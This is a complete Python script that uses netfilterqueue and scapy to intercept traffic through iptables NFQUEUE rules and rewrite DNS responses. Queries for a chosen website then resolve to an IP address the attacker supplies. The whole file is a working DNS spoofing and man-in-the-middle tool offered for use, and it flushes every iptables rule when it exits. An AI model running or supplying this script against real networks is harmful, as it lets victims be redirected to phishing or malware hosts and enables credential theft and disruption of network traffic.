import netfilterqueue
import scapy.all as scapy
import os
key_website = bytes(input("enter the website u wanna redirect:"),  'utf-8')
redirect_ip = input("enter ip you wanna redirect to:")
que_num = int(input("enter queue number(for ip tables, if you dont know what to do, enter 3):"))
print("IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F")
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname    
        if  key_website in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
 
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
 
            packet.set_payload(bytes(scapy_packet))
 
 
    packet.accept()
os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(que_num))
os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(que_num)) 
os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format(que_num)) 
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(que_num, process_packet)
    queue.run()
except:
    os.system('iptables -F')
    print("CTRL + C detected, flushing ip table and cleaning things up")
